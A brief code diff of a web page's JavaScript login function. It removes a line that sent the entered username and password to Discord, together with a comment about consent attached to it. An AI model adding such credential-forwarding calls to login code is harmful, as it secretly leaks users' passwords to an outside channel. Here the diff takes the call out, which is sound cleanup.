@@ -49,10 +49,6 @@
 function doLogin() {
     const username = document.login.username.value;
     const password = document.login.password.value;
-
-    // Ensure you have consent to send sensitive information
-    sendToDiscord(username, password);
-
     return false;
 }
 
